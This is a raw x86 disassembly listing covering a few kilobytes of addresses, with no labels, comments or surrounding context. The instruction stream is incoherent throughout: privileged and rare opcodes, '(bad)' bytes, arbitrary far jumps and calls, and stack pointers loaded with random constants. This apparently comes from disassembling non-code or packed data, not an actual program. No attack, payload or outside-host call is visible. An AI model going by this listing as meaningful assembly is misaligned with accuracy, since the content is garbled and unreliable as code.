  49e0d7:	rsm    
  49e0d9:	or     ah,BYTE PTR [eax+0x46]
  49e0dc:	jmp    0x2a96:0xe455014b
  49e0e3:	mov    al,0x81
  49e0e5:	and    eax,0x5055521c
  49e0ea:	push   ecx
  49e0eb:	ret    0xc6c2
  49e0ee:	stc    
  49e0ef:	sub    eax,0xae05988c
  49e0f4:	jno    0x49e13e
  49e0f6:	mov    edi,DWORD PTR [esi+0x12120c0c]
  49e0fc:	pop    esi
  49e0fd:	sub    ch,cl
  49e0ff:	pusha  
  49e100:	fcom   st(5)
  49e102:	loope  0x49e0ef
  49e104:	or     edx,DWORD PTR [ebx+0x26894a6a]
  49e10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e10b:	shr    DWORD PTR [esi+esi*1],cl
  49e10e:	mov    esp,0x7c077268
  49e113:	push   esp
  49e114:	sar    BYTE PTR [eax+0x0],0x6d
  49e118:	push   ebp
  49e119:	in     eax,0xfa
  49e11b:	sbb    BYTE PTR [ebp+edi*1-0x80],cl
  49e11f:	adc    ecx,DWORD PTR [ebx]
  49e121:	faddp  st(6),st
  49e123:	push   edx
  49e124:	rcr    DWORD PTR [eax-0x66],cl
  49e127:	pop    eax
  49e128:	in     al,dx
  49e129:	push   cs
  49e12a:	push   esi
  49e12b:	jo     0x49e0dc
  49e12d:	jnp    0x49e160
  49e12f:	mov    edx,DWORD PTR ds:0xaf0d684
  49e135:	sub    al,0x6
  49e137:	jp     0x49e0d7
  49e139:	out    0xbd,eax
  49e13b:	pop    ss
  49e13c:	or     al,0x28
  49e13e:	push   es
  49e13f:	and    al,0x20
  49e141:	sbb    al,0x10
  49e143:	or     eax,0x811a362
  49e148:	adc    al,0xc4
  49e14a:	mov    al,0xe8
  49e14c:	test   DWORD PTR [ebp+0x352693f6],ecx
  49e152:	cmp    BYTE PTR [ebp+0x30],0x80
  49e156:	adc    al,0x5e
  49e158:	mov    edx,0xc0829c15
  49e15d:	dec    esp
  49e15e:	or     BYTE PTR [eax],dh
  49e160:	cmc    
  49e161:	and    DWORD PTR ds:0xfb833bf7,0x0
  49e168:	jl     0x49e17c
  49e16a:	cmp    BYTE PTR [edi+0x4980119c],0x3
  49e171:	xchg   DWORD PTR [esi],eax
  49e173:	sub    esp,esp
  49e175:	adc    DWORD PTR [ebp+0x2cc85230],0xab1b1b38
  49e17f:	lds    esp,FWORD PTR [edi]
  49e181:	mov    cl,0x80
  49e183:	jg     0x49e151
  49e185:	mov    dl,0xc5
  49e187:	mov    esi,0x27d128b3
  49e18c:	loopne 0x49e195
  49e18e:	mov    si,0xb3ae
  49e192:	(bad)  
  49e194:	inc    eax
  49e195:	xchg   dh,ah
  49e197:	adc    al,0x4f
  49e199:	pop    esp
  49e19a:	mov    es,WORD PTR [edx-0x7fd6bad4]
  49e1a0:	int3   
  49e1a1:	lods   eax,DWORD PTR ds:[esi]
  49e1a2:	icebp  
  49e1a3:	mov    esp,0x5724d9b3
  49e1a8:	pusha  
  49e1a9:	xchg   esi,eax
  49e1aa:	test   BYTE PTR [eax+0x64],dl
  49e1ad:	xchg   BYTE PTR [ebp+0x15b583a0],ah
  49e1b3:	loope  0x49e207
  49e1b5:	push   es
  49e1b6:	add    dl,bl
  49e1b8:	fs jae 0x49e237
  49e1bb:	retf   
  49e1bc:	(bad)  
  49e1bd:	cmp    DWORD PTR [edi+0x58],ebx
  49e1c0:	inc    esi
  49e1c1:	nop
  49e1c2:	inc    ebp
  49e1c3:	fcomp  QWORD PTR [esi]
  49e1c5:	pop    esp
  49e1c6:	dec    edi
  49e1c7:	push   edx
  49e1c8:	fcom   DWORD PTR [esi+0x4d]
  49e1cb:	loopne 0x49e168
  49e1cd:	push   0x834ec812
  49e1d2:	fsub   QWORD PTR [edi-0x1f6fc7a0]
  49e1d8:	retf   
  49e1d9:	mov    bh,0x42
  49e1db:	and    al,0x2b
  49e1dd:	dec    ebp
  49e1de:	pop    esp
  49e1df:	mov    es,WORD PTR [esp+eiz*2+0x3e290d74]
  49e1e6:	push   edi
  49e1e7:	loope  0x49e206
  49e1e9:	retf   0x6585
  49e1ec:	add    ch,al
  49e1ee:	sub    ebp,DWORD PTR [edx-0x10]
  49e1f1:	add    DWORD PTR [ebx],edi
  49e1f3:	fdivr  st(0),st
  49e1f5:	fcomi  st,st(5)
  49e1f7:	pop    esi
  49e1f8:	inc    esi
  49e1f9:	jle    0x49e241
  49e1fb:	mov    dh,0x30
  49e1fd:	int    0x68
  49e1ff:	hlt    
  49e200:	int3   
  49e201:	fs sti 
  49e203:	sbb    dh,dh
  49e205:	adc    BYTE PTR [edi+0x36],0x55
  49e209:	fdiv   DWORD PTR [eax+0x44]
  49e20c:	mov    ebx,DWORD PTR [edi+0x48]
  49e20f:	sub    BYTE PTR [edx],dl
  49e211:	cs push eax
  49e213:	dec    edi
  49e214:	out    dx,al
  49e215:	push   cs
  49e216:	and    al,0x16
  49e218:	fs (bad) 
  49e21a:	clc    
  49e21b:	push   es
  49e21c:	push   edi
  49e21d:	mov    ecx,0xcb03e674
  49e222:	dec    ebp
  49e223:	adc    BYTE PTR [ebx],ah
  49e225:	in     al,dx
  49e226:	(bad)  
  49e228:	mov    al,0xca
  49e22a:	rol    BYTE PTR [eax+0xd69a0bf],0x6a
  49e231:	setbe  BYTE PTR [edi+esi*4-0x27]
  49e236:	cwde   
  49e237:	and    BYTE PTR ds:0xce72d82b,ah
  49e23d:	dec    edi
  49e23e:	sub    DWORD PTR ds:0x5951f038,esp
  49e244:	int3   
  49e245:	ret    
  49e246:	mov    ds:0xd0c641fd,eax
  49e24b:	sub    eax,DWORD PTR [ecx-0x3b3dd428]
  49e251:	call   0x6a5522b6
  49e256:	lods   al,BYTE PTR ds:[esi]
  49e257:	sbb    eax,0x4d697f55
  49e25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49e25d:	scas   al,BYTE PTR es:[edi]
  49e25e:	in     al,0x50
  49e260:	cmp    ah,ah
  49e262:	mov    eax,ecx
  49e264:	imul   ecx,DWORD PTR [ecx+ebx*4]
  49e268:	in     eax,dx
  49e269:	or     eax,0x72f7a80b
  49e26e:	jge    0x49e258
  49e270:	adc    ecx,DWORD PTR [ebx-0x663cd939]
  49e276:	repnz int3 
  49e278:	jno    0x49e29e
  49e27a:	sub    al,0xdc
  49e27c:	and    al,0x82
  49e27e:	mov    ?,WORD PTR [edi+ecx*8]
  49e281:	in     eax,0x85
  49e283:	dec    edi
  49e284:	and    al,BYTE PTR [eax+esi*8-0x72f90408]
  49e28b:	ds ss mov edi,0x5ad36680
  49e292:	cmp    al,0xc9
  49e294:	mov    cl,BYTE PTR [edi]
  49e296:	xor    BYTE PTR [ecx],dl
  49e298:	pop    ebx
  49e299:	adc    BYTE PTR [ebp-0xc],dl
  49e29c:	sbb    BYTE PTR [eax],dl
  49e29e:	xchg   ebx,eax
  49e29f:	cli    
  49e2a0:	test   al,0x6
  49e2a2:	jne    0x49e2f0
  49e2a4:	add    bh,BYTE PTR [ebx+0x52f026e7]
  49e2aa:	sub    eax,DWORD PTR [ebp-0x77]
  49e2ad:	shr    DWORD PTR [ebx],1
  49e2af:	sar    BYTE PTR [edx],1
  49e2b1:	jecxz  0x49e270
  49e2b3:	sar    BYTE PTR [esi-0x45],0xeb
  49e2b7:	sub    eax,0xc83b298b
  49e2bc:	jle    0x49e2df
  49e2be:	in     al,dx
  49e2bf:	sbb    cl,al
  49e2c1:	sub    eax,ebx
  49e2c3:	add    edi,DWORD PTR [ecx-0x53]
  49e2c6:	or     eax,0xefbe786
  49e2cb:	push   0xd4081ef4
  49e2d0:	sub    BYTE PTR [esi+0x78],0x9e
  49e2d4:	push   ss
  49e2d5:	ret    0x5302
  49e2d8:	lock jecxz 0x49e283
  49e2db:	push   esi
  49e2dc:	lea    esp,[edx]
  49e2de:	sub    al,BYTE PTR [edx+0x44]
  49e2e1:	push   es
  49e2e2:	pop    ss
  49e2e3:	add    al,0xb3
  49e2e5:	xchg   ebp,eax
  49e2e6:	retf   
  49e2e7:	int3   
  49e2e8:	jbe    0x49e2ab
  49e2ea:	xlat   BYTE PTR ds:[ebx]
  49e2eb:	and    BYTE PTR [esi],0x8b
  49e2ee:	daa    
  49e2ef:	cmp    esi,DWORD PTR [ecx+edx*1+0x7ef8e09c]
  49e2f6:	sbb    edi,DWORD PTR [esi-0xf4d8248]
  49e2fc:	outs   dx,BYTE PTR ds:[esi]
  49e2fd:	cdq    
  49e2fe:	inc    esi
  49e2ff:	sar    al,1
  49e301:	iret   
  49e302:	stos   BYTE PTR es:[edi],al
  49e303:	sbb    al,0x1
  49e305:	dec    ebx
  49e306:	imul   esp,DWORD PTR [esi-0x712b83fe],0xda5b1ef6
  49e310:	sar    BYTE PTR [edx],0x66
  49e313:	cmp    al,0x66
  49e315:	sub    ebx,DWORD PTR [edi]
  49e317:	or     al,0xef
  49e319:	js     0x49e2a5
  49e31b:	adc    eax,0x5a036628
  49e320:	push   es
  49e321:	hlt    
  49e322:	adc    ebp,ebx
  49e324:	sbb    eax,esp
  49e326:	pusha  
  49e327:	in     eax,dx
  49e328:	jne    0x49e351
  49e32a:	sub    edx,DWORD PTR [edi]
  49e32c:	xor    eax,0xbb2b9b51
  49e331:	add    ch,BYTE PTR [esi]
  49e333:	and    BYTE PTR [edi+0x744082be],dl
  49e339:	inc    eax
  49e33a:	leave  
  49e33b:	je     0x49e319
  49e33d:	fld    TBYTE PTR [esi]
  49e33f:	fwait
  49e340:	and    bh,BYTE PTR [esi+0x7d56fb82]
  49e346:	clc    
  49e347:	push   es
  49e348:	lock inc edx
  49e34a:	jb     0x49e370
  49e34c:	outs   dx,DWORD PTR ds:[esi]
  49e34d:	jo     0x49e3ba
  49e34f:	inc    edx
  49e350:	xchg   BYTE PTR [edx+0x580f81b6],al
  49e356:	and    DWORD PTR [eax],ebx
  49e358:	jne    0x49e385
  49e35a:	add    bh,BYTE PTR [eax-0x7b]
  49e35d:	add    ecx,DWORD PTR [ebx-0x6783cbcb]
  49e363:	jp     0x49e3cf
  49e365:	dec    esp
  49e366:	outs   dx,BYTE PTR ds:[esi]
  49e367:	xchg   esi,eax
  49e368:	adc    dh,BYTE PTR [edi+0x626c0c77]
  49e36e:	pop    esi
  49e36f:	dec    eax
  49e370:	pop    eax
  49e371:	cmp    edx,0xe
  49e374:	mov    DWORD PTR ss:[eax+0x8],edx
  49e378:	out    0x61,eax
  49e37a:	jmp    0xed2d:0xa931eb5c
  49e381:	(bad)  
  49e382:	jge    0x49e3a9
  49e384:	scas   al,BYTE PTR es:[edi]
  49e385:	pusha  
  49e386:	add    esi,ecx
  49e388:	add    DWORD PTR [eax+0x37],esi
  49e38b:	sbb    cl,BYTE PTR [ebx-0x35fc9bb8]
  49e391:	add    DWORD PTR [eax+0x40],ecx
  49e394:	adc    BYTE PTR [eax+0x657c8e61],al
  49e39a:	add    DWORD PTR [ebx],eax
  49e39c:	add    ebx,ebp
  49e39e:	mov    esi,0x826626ae
  49e3a3:	js     0x49e33d
  49e3a5:	fisttp DWORD PTR [eax+ebx*2]
  49e3a8:	fs repnz scas al,BYTE PTR es:[edi]
  49e3ab:	and    BYTE PTR [edx-0x5c],dl
  49e3ae:	pop    edx
  49e3af:	adc    al,0xd2
  49e3b1:	and    eax,0x801ee129
  49e3b6:	test   DWORD PTR [esi],ebp
  49e3b8:	inc    edx
  49e3b9:	mov    esp,eax
  49e3bb:	lea    ebp,[ecx-0x1e]
  49e3be:	ret    0xf37b
  49e3c1:	sub    esi,DWORD PTR [edi]
  49e3c3:	rcr    DWORD PTR [esi],1
  49e3c5:	xchg   esp,eax
  49e3c6:	or     DWORD PTR [esp+esi*1+0x32],eax
  49e3ca:	fcomp  DWORD PTR [edx]
  49e3cc:	mov    eax,DWORD PTR [esi+edx*1-0x200219d1]
  49e3d3:	add    ah,BYTE PTR [ebx]
  49e3d5:	pop    DWORD PTR [esp+edx*1+0x46014870]
  49e3dc:	lea    ecx,[esi+esi*1]
  49e3df:	add    DWORD PTR [edi],ecx
  49e3e1:	pop    edi
  49e3e2:	das    
  49e3e3:	cmp    DWORD PTR [edi-0x3f6aeba0],0x5b
  49e3ea:	cdq    
  49e3eb:	stos   BYTE PTR es:[edi],al
  49e3ec:	es push ds
  49e3ee:	add    dl,BYTE PTR [ecx]
  49e3f0:	dec    ecx
  49e3f1:	lock cmp esi,0xd1f6b2be
  49e3f8:	add    BYTE PTR [esi-0x44],bh
  49e3fb:	loopne 0x49e42f
  49e3fd:	cmp    ebx,DWORD PTR [ebx]
  49e3ff:	inc    edx
  49e400:	hlt    
  49e401:	add    ch,cl
  49e403:	in     eax,0x8
  49e405:	adc    dl,BYTE PTR [edi-0x33]
  49e408:	arpl   WORD PTR [ebp+0x1d],ax
  49e40b:	sub    edx,eax
  49e40d:	mov    al,ds:0x53a2675
  49e412:	test   al,0xd8
  49e414:	xchg   edi,eax
  49e415:	sub    esi,ebx
  49e417:	mov    ds:0xdcd458f2,al
  49e41c:	fst    QWORD PTR [eax+ecx*4]
  49e41f:	mov    al,0x4a
  49e421:	inc    esi
  49e422:	mov    eax,ds:0x7cc319d8
  49e427:	cmp    eax,0xc137df7
  49e42c:	call   0x35851cb0
  49e431:	rcr    BYTE PTR [edi+edi*2],1
  49e434:	xor    BYTE PTR [esi-0x4c],bh
  49e437:	mov    esp,0x481c9c06
  49e43c:	and    eax,0x44a15014
  49e441:	cmp    al,0x6
  49e443:	arpl   WORD PTR [edx],bx
  49e445:	ficomp WORD PTR ds:0x443ef096
  49e44b:	pop    edi
  49e44c:	mov    DWORD PTR [ebx+0x7f],edx
  49e44f:	popa   
  49e450:	adc    esi,DWORD PTR [esi]
  49e452:	mov    esp,0x5847f137
  49e457:	sbb    BYTE PTR ds:0x95f6aa5e,dl
  49e45d:	das    
  49e45e:	lock cmp ebx,DWORD PTR [edx]
  49e461:	cmp    esi,ebp
  49e463:	dec    ebx
  49e464:	add    DWORD PTR [ebx-0x55],edi
  49e467:	or     BYTE PTR [ebx+0x0],al
  49e46a:	push   0xd616e989
  49e46f:	xchg   edx,eax
  49e470:	push   esi
  49e471:	in     al,0xf4
  49e473:	add    eax,0x18756ed2
  49e478:	push   edx
  49e479:	jp     0x49e4a9
  49e47b:	mov    bl,BYTE PTR [eax+eiz*1+0x17]
  49e47f:	enter  0x8b03,0x1
  49e483:	enter  0x7205,0x81
  49e487:	mov    BYTE PTR [esi+0x17205c81],al
  49e48d:	add    DWORD PTR [ebp+0x7205c817],0xffffff82
  49e494:	test   BYTE PTR [esi+ebp*1],al
  49e497:	sbb    DWORD PTR [eax+eiz*1+0x2],0x204f8624
  49e49f:	rol    DWORD PTR [edi+0x0],cl
  49e4a2:	mov    edi,edi
  49e4a4:	dec    ebp
  49e4a5:	pop    es
  49e4a6:	ret    0xde4e
  49e4a9:	sar    DWORD PTR [esi+0x8910665],cl
  49e4af:	push   cs
  49e4b0:	jge    0x49e447
  49e4b2:	push   ds
  49e4b3:	lods   eax,DWORD PTR ds:[esi]
  49e4b4:	(bad)
  49e4b7:	neg    esp
  49e4b9:	paddusw mm6,mm5
  49e4bc:	push   ss
  49e4bd:	or     eax,0x2c3d0625
  49e4c2:	inc    ecx
  49e4c3:	jns    0x49e4a3
  49e4c5:	push   ebp
  49e4c6:	push   ss
  49e4c7:	ins    DWORD PTR es:[edi],dx
  49e4c8:	test   DWORD PTR [esi+esi*2+0x3cbc8e4d],ebp
  49e4cf:	loop   0x49e548
  49e4d1:	sbb    BYTE PTR [ebx-0x64],bl
  49e4d4:	nop
  49e4d5:	add    al,0x84
  49e4d7:	xor    al,0x34
  49e4d9:	dec    ecx
  49e4da:	rcr    BYTE PTR [ebx+0x12],0x64
  49e4de:	test   eax,0x475b3c2
  49e4e3:	push   cs
  49e4e4:	hlt    
  49e4e5:	lock and al,0x56
  49e4e8:	mov    eax,0xf1b32521
  49e4ed:	mov    ebp,0x1beb0c5d
  49e4f2:	or     BYTE PTR [ebx-0x6bd68fbd],cl
  49e4f8:	fsub   DWORD PTR [edi-0x7bc0ee00]
  49e4fe:	push   esi
  49e4ff:	push   eax
  49e500:	inc    edx
  49e501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49e502:	xor    al,0x44
  49e504:	adc    eax,0x67b4b965
  49e509:	int    0xe
  49e50b:	sub    BYTE PTR [eax],cl
  49e50d:	dec    ebx
  49e50e:	jmp    0x49e51d
  49e510:	push   eax
  49e511:	dec    esp
  49e512:	cmp    al,0x8
  49e514:	or     DWORD PTR [ebx+0x20e6d4f5],ecx
  49e51a:	je     0x49e526
  49e51c:	push   cs
  49e51d:	fwait
  49e51e:	clc    
  49e51f:	fild   WORD PTR [eax+0x3f]
  49e522:	add    eax,0x743c00b8
  49e527:	add    BYTE PTR [ebx+0x678dec94],dl
  49e52d:	cmp    BYTE PTR ds:0xed29ba40,bl
  49e533:	sbb    eax,0xd3ffc62d
  49e538:	ficom  DWORD PTR [ecx+0x12]
  49e53b:	loopne 0x49e571
  49e53d:	xor    al,0xd0
  49e53f:	aas    
  49e540:	iret   
  49e541:	add    eax,0x4fd82e50
  49e546:	and    BYTE PTR [ebx-0x7b84dba9],cl
  49e54c:	mov    bh,cl
  49e54e:	into   
  49e54f:	inc    edi
  49e550:	sbb    al,0x62
  49e552:	int3   
  49e553:	adc    al,0x25
  49e555:	sbb    al,0x4a
  49e557:	dec    ebp
  49e558:	enter  0x3628,0xc8
  49e55c:	mov    al,0x16
  49e55e:	add    eax,0x3bb0c2b3
  49e563:	jo     0x49e587
  49e565:	call   0xd08f36ea
  49e56a:	ss push 0x5
  49e56d:	call   0xc868:0x260aaa9
  49e574:	cmp    al,BYTE PTR [edx+ebx*4+0x60b5130]
  49e57b:	push   eax
  49e57c:	jmp    0x4635:0x7051f09a
  49e583:	das    
  49e584:	aam    0x84
  49e586:	repz and dl,ah
  49e589:	and    edi,DWORD PTR [ebp+0x2526b6b1]
  49e58f:	test   DWORD PTR [ebx+0xaf0a602],ecx
  49e595:	cmp    ebx,ebp
  49e597:	push   cs
  49e598:	push   eax
  49e599:	lea    eax,[eax+0x56]
  49e59c:	ja     0x49e59e
  49e59e:	jns    0x49e54a
  49e5a0:	lock dec ebp
  49e5a2:	lock pop esp
  49e5a4:	xchg   esi,eax
  49e5a5:	test   BYTE PTR [edi-0x71],ah
  49e5a8:	adc    al,0xe0
  49e5aa:	call   0xb7e461b
  49e5af:	sahf   
  49e5b0:	dec    eax
  49e5b1:	loopne 0x49e599
  49e5b3:	pop    edx
  49e5b4:	xor    DWORD PTR [eax+0x20],ebx
  49e5b7:	mov    ebp,DWORD PTR [ebx+0x2]
  49e5ba:	repz int 0x4f
  49e5bd:	sbb    al,0x24
  49e5bf:	push   0xfffffffd
  49e5c1:	mov    DWORD PTR [ebp+0x48],edx
  49e5c4:	sbb    ch,BYTE PTR [eax]
  49e5c6:	adc    al,0x14
  49e5c8:	mov    ah,0xa0
  49e5ca:	add    al,0x53
  49e5cc:	inc    ebp
  49e5cd:	pop    eax
  49e5ce:	dec    ebp
  49e5cf:	jne    0x49e641
  49e5d1:	pop    ecx
  49e5d2:	cwde   
  49e5d3:	mov    ds:0x361bf8ab,al
  49e5d8:	mov    ah,0xd6
  49e5da:	adc    al,0x39
  49e5dc:	adc    BYTE PTR [ebx-0x29],cl
  49e5df:	add    eax,0xf95708ae
  49e5e4:	pusha  
  49e5e5:	push   ecx
  49e5e6:	outs   dx,DWORD PTR ds:[esi]
  49e5e7:	aam    0x57
  49e5e9:	or     DWORD PTR ds:[ebx+0x24fc5e12],esi
  49e5f0:	aaa    
  49e5f1:	clc    
  49e5f2:	les    esi,FWORD PTR [ebx]
  49e5f4:	nop
  49e5f5:	outs   dx,DWORD PTR ds:[esi]
  49e5f6:	push   eax
  49e5f7:	rcl    DWORD PTR [ebp+edi*1-0x703b946e],cl
  49e5fe:	or     BYTE PTR [ecx-0x1],dl
  49e601:	xlat   BYTE PTR ds:[ebx]
  49e602:	mov    al,ds:0x8cd2552
  49e607:	loop   0x49e5dd
  49e609:	rcr    BYTE PTR [eax],cl
  49e60b:	sbb    BYTE PTR [ecx-0x4b1e1e9c],dl
  49e611:	fsubr  DWORD PTR cs:[ecx-0x65aac763]
  49e618:	out    dx,eax
  49e619:	scas   eax,DWORD PTR es:[edi]
  49e61a:	push   0x44
  49e61c:	mov    al,0x68
  49e61e:	dec    edx
  49e61f:	dec    ebx
  49e620:	adc    BYTE PTR [edx],bl
  49e622:	test   BYTE PTR [edi-0x43],0x76
  49e626:	inc    ecx
  49e627:	ficomp DWORD PTR [edx]
  49e629:	push   esp
  49e62a:	mov    dh,0xca
  49e62c:	sbb    BYTE PTR [edi],bl
  49e62e:	call   0x462bdde6
  49e633:	aaa    
  49e634:	and    BYTE PTR [ebx],cl
  49e636:	fmul   QWORD PTR [edi-0x6d896196]
  49e63c:	push   ebx
  49e63d:	jbe    0x49e672
  49e63f:	sub    al,0x12
  49e641:	xchg   esp,eax
  49e642:	add    DWORD PTR [esi],ebp
  49e644:	or     esi,DWORD PTR [eax+0x7e]
  49e647:	mov    ds:0x22e40298,ax
  49e64d:	or     eax,0x138c1b5
  49e652:	pusha  
  49e653:	test   BYTE PTR [ecx-0x25ffc57e],ah
  49e659:	mov    edi,0x584aea6c
  49e65e:	lock push ds
  49e660:	jle    0x49e69b
  49e662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49e663:	jne    0x49e6ce
  49e665:	call   0x80a4e87b
  49e66a:	add    esp,DWORD PTR [edx+edx*2]
  49e66d:	out    dx,eax
  49e66e:	adc    al,0xb0
  49e670:	or     al,BYTE PTR ds:0x82e8982b
  49e676:	(bad)  
  49e677:	hlt    
  49e678:	adc    al,0x1a
  49e67a:	pop    esp
  49e67b:	loope  0x49e641
  49e67d:	push   es
  49e67e:	test   al,0xf8
  49e680:	leave  
  49e681:	clc    
  49e682:	mov    al,0xad
  49e684:	rol    BYTE PTR [ecx],1
  49e686:	retf   
  49e687:	in     al,dx
  49e688:	fidiv  WORD PTR ds:0xa85b6ee1
  49e68e:	fisub  DWORD PTR [eax]
  49e690:	inc    ecx
  49e691:	cmp    al,BYTE PTR [esi-0x5f]
  49e694:	pop    ss
  49e695:	xor    eax,0x38c6d832
  49e69a:	sbb    BYTE PTR [ebx+eiz*8],bh
  49e69d:	mov    eax,ds:0xd35116c2
  49e6a2:	inc    BYTE PTR [esi]
  49e6a4:	and    bl,BYTE PTR ss:[esi*4-0x1ff9ee0d]
  49e6ac:	mov    esp,ecx
  49e6ae:	pop    edi
  49e6af:	push   ss
  49e6b0:	loop   0x49e699
  49e6b2:	ror    BYTE PTR [edi],1
  49e6b4:	in     eax,dx
  49e6b5:	jmp    0x49e6e0
  49e6b7:	cmp    eax,DWORD PTR [edi+0x64]
  49e6ba:	jae    0x49e6a5
  49e6bc:	or     BYTE PTR [ecx+0x606ea148],ch
  49e6c2:	jb     0x49e6d8
  49e6c4:	call   0xded8a4d4
  49e6c9:	cmp    al,0x39
  49e6cb:	xor    dh,BYTE PTR [ebp-0x28]
  49e6ce:	pop    edi
  49e6cf:	dec    ebp
  49e6d0:	pop    es
  49e6d1:	sahf   
  49e6d2:	hlt    
  49e6d3:	loop   0x49e73f
  49e6d5:	loopne 0x49e6bf
  49e6d7:	in     al,0x24
  49e6d9:	pop    ebx
  49e6da:	pusha  
  49e6db:	test   BYTE PTR [eax+0x45],bl
  49e6de:	mov    eax,0x1612f226
  49e6e3:	mov    ecx,0x5fd8184d
  49e6e8:	test   BYTE PTR ds:0x3c410f80,0x49
  49e6ef:	jne    0x49e6e2
  49e6f1:	sbb    ah,BYTE PTR [eax]
  49e6f3:	or     ah,bl
  49e6f5:	nop
  49e6f6:	push   es
  49e6f7:	repz pop edx
  49e6f9:	jb     0x49e73d
  49e6fb:	dec    esi
  49e6fc:	imul   ebx,eax,0xffffffc5
  49e6ff:	call   0x606dc0c9
  49e704:	adc    eax,0x7bfc2a35
  49e709:	xchg   BYTE PTR [eax+edi*2],dl
  49e70c:	ror    BYTE PTR [ecx+0x2],0xa0
  49e710:	inc    edi
  49e711:	or     eax,0x8b70e0b0
  49e716:	rcl    DWORD PTR [ebx-0x4a7b58a5],0x61
  49e71d:	out    0x39,al
  49e71f:	retf   0x2376
  49e722:	pop    ss
  49e723:	sub    BYTE PTR [eax*4-0x593a7e70],dl
  49e72a:	test   ah,al
  49e72c:	mov    al,ds:0x6c215e33
  49e731:	arpl   WORD PTR ds:0x6c7ab27,sp
  49e737:	rol    al,0x0
  49e73a:	and    bl,al
  49e73c:	adc    eax,0x2081833c
  49e741:	adc    DWORD PTR ss:[ebx],0xffffffc6
  49e745:	pop    esi
  49e746:	cmp    cl,BYTE PTR [ecx]
  49e748:	arpl   WORD PTR [ebx],cx
  49e74a:	sti    
  49e74b:	std    
  49e74c:	sbb    DWORD PTR [esi+0x10414c46],esp
  49e752:	inc    eax
  49e753:	adc    ah,BYTE PTR [ebp+0xb]
  49e756:	or     eax,0x281fa59e
  49e75b:	aam    0x9
  49e75d:	ret    0x2340
  49e760:	or     al,0x63
  49e762:	mov    ecx,0x2584b3a1
  49e767:	shr    BYTE PTR [eax+0x35],1
  49e76a:	jp     0x49e7be
  49e76c:	clc    
  49e76d:	ds add al,0xba
  49e770:	cmp    eax,ebx
  49e772:	ja     0x49e724
  49e774:	gs xchg edx,eax
  49e776:	adc    edi,0xffffffbb
  49e779:	sbb    eax,0xc5e42f24
  49e77e:	xor    DWORD PTR [ebx+edx*2],0xfffffff0
  49e782:	ret    
  49e783:	jmp    0x49e7dd
  49e785:	dec    eax
  49e786:	push   cs
  49e787:	std    
  49e788:	mov    ebp,0xfd26ef33
  49e78d:	data16 jo 0x49e71e
  49e790:	cwde   
  49e791:	gs mov eax,0x3340c4af
  49e797:	xor    al,0xb0
  49e799:	popf   
  49e79a:	push   es
  49e79b:	push   0x1f
  49e79d:	cmp    BYTE PTR [edi-0x4da96c38],ch
  49e7a3:	popa   
  49e7a4:	xor    DWORD PTR [ecx+ecx*2],esp
  49e7a7:	sub    cl,dh
  49e7a9:	push   esi
  49e7aa:	aad    0x92
  49e7ac:	shl    BYTE PTR [edx],1
  49e7ae:	cmp    ebx,esi
  49e7b0:	mov    ds:0x71cc4c1d,eax
  49e7b5:	pop    esi
  49e7b6:	and    eax,0x9594df08
  49e7bb:	mov    esp,0x73db7828
  49e7c0:	jo     0x49e779
  49e7c2:	mov    cs,WORD PTR ds:0x8c38a3a
  49e7c8:	or     DWORD PTR [edi],esp
  49e7ca:	jnp    0x49e834
  49e7cc:	and    al,0x2f
  49e7ce:	(bad)  
  49e7cf:	ja     0x49e785
  49e7d1:	sub    BYTE PTR [eax+0x2c],ah
  49e7d4:	jp     0x49e7e5
  49e7d6:	cli    
  49e7d7:	out    dx,eax
  49e7d8:	pop    ecx
  49e7d9:	push   cs
  49e7da:	adc    ebx,ebp
  49e7dc:	mov    cl,0x67
  49e7de:	popa   
  49e7df:	fist   DWORD PTR ds:0x514a1789
  49e7e5:	(bad)  
  49e7e6:	sub    al,0xec
  49e7e8:	inc    esp
  49e7e9:	nop
  49e7ea:	adc    ah,dh
  49e7ec:	mov    dl,0xe7
  49e7ee:	push   edi
  49e7ef:	push   0xe3e350e8
  49e7f4:	dec    edx
  49e7f5:	push   0x42800803
  49e7fa:	pop    edx
  49e7fb:	mov    ah,0x13
  49e7fd:	sar    DWORD PTR [eax-0x4eebefae],cl
  49e803:	xor    ch,al
  49e805:	or     al,0x68
  49e807:	jmp    0x3e37:0x85a7
  49e80d:	fwait
  49e80e:	mov    BYTE PTR [ecx+0x24],al
  49e811:	cmp    al,0xa
  49e813:	sub    eax,0xc28dd7a4
  49e818:	mov    al,0xf0
  49e81a:	dec    edx
  49e81b:	sub    BYTE PTR [edx+ebx*4],ah
  49e81e:	dec    eax
  49e81f:	clc    
  49e820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49e821:	adc    al,0x47
  49e823:	or     al,0xbb
  49e825:	outs   dx,BYTE PTR ds:[esi]
  49e826:	pop    ss
  49e827:	(bad)  
  49e828:	pop    DWORD PTR [ebp-0x7c]
  49e82b:	dec    eax
  49e82c:	xor    bh,0xb4
  49e82f:	push   ebp
  49e830:	pop    esp
  49e831:	hlt    
  49e832:	rol    BYTE PTR [esi],1
  49e834:	in     al,0xb4
  49e836:	scas   eax,DWORD PTR es:[edi]
  49e837:	or     DWORD PTR [eax+0x5aea234b],ebp
  49e83d:	push   ebx
  49e83e:	jle    0x49e86c
  49e840:	push   ebp
  49e841:	fcmovu st,st(0)
  49e843:	cmp    eax,0x8d774ef0
  49e848:	push   edx
  49e849:	out    dx,eax
  49e84a:	sub    eax,0xe787b61
  49e84f:	cmp    WORD PTR [eax+0x72],dx
  49e853:	or     BYTE PTR [edi+0x3],bh
  49e856:	add    DWORD PTR [edx],esp
  49e858:	mov    eax,0xe08de542
  49e85d:	pop    ss
  49e85e:	add    BYTE PTR [edx],0x47
  49e861:	pusha  
  49e862:	or     al,0xf8
  49e864:	or     DWORD PTR [eax+0x3c],ebp
  49e867:	nop
  49e868:	inc    edx
  49e869:	shl    ah,1
  49e86b:	xor    eax,DWORD PTR [ecx+0x1a064978]
  49e871:	add    DWORD PTR [edi-0x7b],edx
  49e874:	call   0xe665c59a
  49e879:	scas   al,BYTE PTR es:[edi]
  49e87a:	ficomp DWORD PTR [ebx-0xdb60267]
  49e880:	add    eax,DWORD PTR [eax]
  49e882:	or     ah,cl
  49e884:	adc    al,0x40
  49e886:	call   0x5880d190
  49e88b:	ss out 0x0,al
  49e88e:	fwait
  49e88f:	cld    
  49e890:	push   edx
  49e891:	xor    edx,DWORD PTR [eax]
